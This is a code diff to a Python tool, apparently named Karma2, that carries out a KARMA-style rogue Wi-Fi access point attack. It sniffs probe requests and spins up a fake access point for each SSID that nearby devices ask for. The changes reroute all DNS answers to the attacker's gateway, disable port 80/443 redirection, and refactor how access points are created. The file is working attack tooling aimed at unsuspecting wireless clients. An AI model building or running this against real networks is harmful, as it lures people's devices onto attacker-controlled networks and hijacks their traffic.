@@ -21,8 +21,10 @@ class Karma2:
       iface,self.airbase_process = self.create_access_point(essid)
       subnet = self.karma.get_unique_subnet()
       self.setup_iface(iface,subnet)
-      self.setup_redirections(iface,80,8080)
-      self.setup_redirections(iface,443,8080)
+      # redirect the following ports
+      #self.setup_redirections(iface,80,8080)
+      #self.setup_redirections(iface,443,8080)
+      #self.setup_redirections(iface,443,8080)
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
 
     def run(self):
@@ -93,7 +95,7 @@ class Karma2:
         '-F', '192.168.%d.100,192.168.%d.200'%(subnet,subnet),
         '--dhcp-option=option:router,192.168.%d.254'%(subnet),
         '--dhcp-option=option:dns-server,192.168.%d.254'%(subnet),
-        '-R','-S','8.8.8.8',
+        '-R','--address=/#/192.168.%d.254'%(subnet)
       ]
       p = subprocess.Popen(cmd,
         stdout=subprocess.PIPE,
@@ -160,6 +162,12 @@ class Karma2:
   def release_ap(self, essid):
     self.aps.pop(essid)
 
+  def create_ap(self, essid):
+    ap = self.AccessPoint(self, essid)
+    ap.daemon = True
+    ap.start()
+    self.register_ap(essid,ap)
+
   def do_sniff(self):
     def _filter(packet):
       if packet.haslayer(Dot11ProbeReq):
@@ -173,11 +181,8 @@ class Karma2:
 
           if (not section.info in self.aps.keys()
             and not section.info in self.FORBIDDEN_APS):
-
-            ap = self.AccessPoint(self, section.info)
-            ap.daemon = True
-            ap.start()
-            self.register_ap(section.info,ap)
+            
+            self.create_ap(section.info)
 
     sniff(prn=_filter,store=0)
 
@@ -186,9 +191,10 @@ if __name__ == '__main__':
   # network interface connect to the outside world
   GATEWAY_INTERFACE='wlan0'
   # 802.11 monitor interface created using airmon-zc 
-  MONITOR_INTERFACE='wlan1mon'
+  MONITOR_INTERFACE='wlan2mon'
   km = Karma2(GATEWAY_INTERFACE, MONITOR_INTERFACE)
 
+  #km.create_ap('NSA Honeypot')
   km.do_sniff()
 
   while True:
